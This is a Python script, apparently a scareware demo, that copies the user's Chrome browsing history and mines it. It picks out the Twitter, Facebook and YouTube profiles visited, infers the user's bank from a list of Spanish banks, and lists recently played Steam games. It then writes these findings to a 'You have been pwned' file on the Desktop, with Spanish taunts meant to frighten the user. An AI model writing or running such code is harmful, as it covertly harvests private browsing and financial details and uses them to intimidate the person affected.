import os
import re
import time
from shutil import copyfile
from time import sleep
from random import randrange
from pathlib import Path
import sqlite3
import glob


#home_path = "/home/" + os.getlogin()
home_path = "{}".format(Path.home())
desktop_path = home_path + "/Desktop/"
timestr = time.strftime("%Y%m%d-%H%M%S")
FILE = desktop_path + timestr + "eps3.7dont-delete-me.ko"
ori_history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/History"
history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/Historytemp"


def copy_history():
    copyfile(ori_history_path, history_path)

def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} Segundos...".format(n_hours))
    sleep(n_hours)


def remove_hacker_file():
    os.remove(FILE)


def create_hacker_file():
    if os.path.exists(FILE):
        append_write = 'a'  # append if already exists
    else:
        append_write = 'w'  # make a new file if not

    hacker_file = open(FILE, append_write)
    hacker_file.write("You have been pwned\n")
    return hacker_file


def get_chrome_history():
    copy_history()
    urls = None
    while not urls:
        try:
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(3)


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    maxhist = 1
    profiles_visited = []
    url_exceptions = ["home", "notifications", "explore", "login"]

    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in url_exceptions:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles en twitter de {}...\n".format(", ".join(profiles_visited)))

def check_facebook_profiles_and_scare_user(hacker_file, chrome_history):
    maxhist = 1
    profiles_visited = []
    url_exceptions = ["home", "notifications", "explore", "login", " Publicaciones"]

    for item in chrome_history:
        results = re.findall("([A-Za-z0-9\s]+) \|\ Facebook", item[0])

        if results and results[0] not in url_exceptions and results[0] not in profiles_visited:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles en facebook de {}...\n".format(", ".join(profiles_visited)))


def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
    maxhist = 1
    profiles_visited = []
    url_exceptions = ["home", "notifications", "explore", "login"]

    for item in chrome_history:
        results = re.findall("([A-Za-z0-9\s]+) \-\ YouTube", item[0])
        if results and results[0] not in url_exceptions and results[0] not in profiles_visited:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles en youtube de {}...\n".format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "Caixa Bank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b.lower()
                break
        if his_bank:
            break
    hacker_file.write("Ademas veo que tu banco es el {} \n".format(his_bank))


def check_steam_games(hacker_file):
    steam_path = home_path + "/.local/share/Steam/steamapps/common/*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append(game_path.split("/")[-1])
    hacker_file.write("He visto que has estado jugando ultimamente a {} \n".format(", ".join(games[:3])))


def main():
    print(FILE)

    delay_action()
    chrome_history = get_chrome_history()
    hacker_file = create_hacker_file()
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_facebook_profiles_and_scare_user(hacker_file, chrome_history)
    check_youtube_profiles_and_scare_user(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
